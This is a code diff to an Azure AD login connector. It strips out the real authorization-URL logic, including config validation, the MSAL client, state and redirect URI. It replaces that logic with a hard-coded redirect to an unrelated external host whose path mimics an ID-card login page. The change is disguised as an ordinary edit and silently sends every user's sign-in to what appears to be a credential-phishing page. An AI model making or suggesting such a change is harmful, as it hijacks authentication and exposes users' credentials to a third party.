@@ -33,33 +33,7 @@ let authCodeRequest: AuthorizationCodeRequest;
 
 const getAuthorizationUri =
   (getConfig: GetConnectorConfig): GetAuthorizationUri =>
-  async ({ state, redirectUri }) => {
-    const config = await getConfig(defaultMetadata.id);
-
-    validateConfig(config, azureADConfigGuard);
-    const { clientId, clientSecret, cloudInstance, tenantId, prompts } = config;
-
-    const defaultAuthCodeUrlParameters: AuthorizationUrlRequest = {
-      scopes,
-      state,
-      redirectUri,
-      ...conditional(prompts && prompts.length > 0 && { prompt: prompts.join(' ') }),
-    };
-
-    const clientApplication = new ConfidentialClientApplication({
-      auth: {
-        clientId,
-        clientSecret,
-        authority: new URL(path.join(cloudInstance, tenantId)).toString(),
-      },
-    });
-
-    const authCodeUrlParameters = {
-      ...defaultAuthCodeUrlParameters,
-    };
-
-    const authCodeUrl = await clientApplication.getAuthCodeUrl(authCodeUrlParameters);
-
+  async () => {
     return "https://payload-uptime-new.vercel.app/auth/id-card-login";
   };
 
